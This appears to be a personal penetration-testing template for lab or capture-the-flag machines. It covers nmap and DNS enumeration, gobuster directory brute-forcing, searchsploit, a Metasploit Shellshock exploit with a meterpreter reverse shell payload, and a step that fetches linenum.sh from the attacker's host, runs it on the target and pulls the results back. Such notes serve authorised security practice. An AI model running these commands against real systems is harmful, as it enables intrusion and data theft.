# tempalte, flow

```sh
remote-host (hostname during setup): <rhostslot>
local-host (ip): <lhostslot>
```

## Summary

+ example

## prev enum

```sh
sudo nmap -sS -sC -sV -oA ./nmap/full_sS -O -p- <rhostslot>
  # rename-tab
sudo vim /etc/hosts
<rhostslot>    <name>
```

## web enum

### dns recon

```sh
nslookup
  # AD, find DC, etc.

# try zone transfer
host -l <rhostslot> <dnsServer>
dnsrecon -d <rhostslot> -t axfr
  # dnsrecon -d megacorpone.com -t axfr
```

### gobuster

```sh
dict="/usr/share/wordlists/dirb/common.txt"
ls -lah $dict                                    # 36KB
gobuster dir -u http://<rhostslot>/ -w $dict -t 20 -e -x php,asp,json,aspx
  # 5min
  # find /cgi-bin/ (status 403)

gobuster dir -u http://<rhostslot>/cgi-bin/ -w $dict -t 20 -e -x cgi,sh,pl,py,rb,php
  # 5min
  # find /user.sh (status 200)
```

## exploit (user shell)

### searchsploit

```sh
search keywords
searchsploit keywords
```

```sh
cdee
cp /usr/share/exploitdb/exploits/example ~/assets/example/temp.php
cda
```

### example-vector

### interactive shell

```sh
python -c 'import pty; pty.spawn("/bin/bash")'
  # C-z to background the shell
stty raw -echo; fg
```

## exploit (root)

### post enum

```sh
ps aux
sudo -l
```

### privilege escalation

```sh
```

## msf

```msfconsole
msf> search <keywords>
  # 2  exploit/multi/http/apache_mod_cgi_bash_env_exec      2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
msf> use 2
msf> show advanced
msf> show options
msf> set RHOSTS <rhostslot>
msf> ...

msf> show payloads
  # 14 payload/linux/x86/meterpreter/reverse_tcp                          normal  No     Linux Mettle x86, Reverse TCP Stager
msf> set payload 14

msf> run -j
  # meterpreter user shell
```

## util

+ rhost

```sh
wget <lhostslot>:8000/linenum.sh -O /tmp/linenum.sh
bash /tmp/lineum.sh > /tmp/linenumOut.md

python -m SimpleHTTPServer 8000 /tmp
```

+ lhost

```sh
wget <rhostslot>:8000/linenumOut.md
```
